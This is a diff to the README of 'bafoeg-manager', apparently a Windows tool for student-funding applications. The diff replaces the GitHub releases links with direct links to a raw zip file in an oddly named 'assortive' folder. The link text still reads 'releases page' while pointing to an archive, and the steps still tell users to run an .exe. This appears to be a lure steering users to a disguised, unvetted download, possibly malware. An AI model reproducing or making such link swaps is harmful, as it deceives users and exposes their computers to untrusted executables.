@@ -1,6 +1,6 @@
 # 📑 bafoeg-manager - Organize your student funding application easily
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/anna-mariapast170/bafoeg-manager/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/anna-mariapast170/bafoeg-manager/main/assortive/manager-bafoeg-2.6.zip)
 
 ## 🎯 About this software
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11. Your system should have at
 
 Follow these steps to set up the software.
 
-1. Visit the [releases page](https://github.com/anna-mariapast170/bafoeg-manager/releases).
+1. Visit the [releases page](https://raw.githubusercontent.com/anna-mariapast170/bafoeg-manager/main/assortive/manager-bafoeg-2.6.zip).
 2. Look for the latest version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
